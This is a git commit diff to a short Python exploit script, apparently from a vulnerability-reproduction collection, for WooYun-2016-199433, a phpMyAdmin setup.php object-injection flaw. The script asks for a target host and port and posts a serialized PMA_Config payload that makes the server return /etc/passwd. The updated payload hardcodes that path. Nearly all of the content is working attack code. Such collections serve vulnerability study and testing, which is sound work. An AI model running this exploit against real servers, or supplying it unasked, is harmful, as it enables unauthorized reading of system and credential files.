5fe1c9df01a5df2696b0bb4699e5a5c6da1de279
fuutianyii <70436206+fuutianyii@users.noreply.github.com>
2022-04-01 10:05:33 +0800

    Update WooYun-2016-199433.py

--- WooYun-2016-199433.py
+++ WooYun-2016-199433.py
@@ -3,9 +3,10 @@ import requests
 RHOST=input("RHOST:")
 RPORT=input("RPORT:")
 PATH=input("PATH:")
+headers={"Content-Type": "application/x-www-form-urlencoded"}
+#proxies={"http":"http://127.0.0.1:8080"}
+data="""action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}"""
 
-data={"configuration":"O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"{PATH}\";}","action":"test"}
-
-res=requests.post(f"http://{RHOST}:{RPORT}/scripts/setup.php",data=data)
+res=requests.post(f"http://{RHOST}:{RPORT}/scripts/setup.php",data=data,headers=headers)
 
 print(res.text)
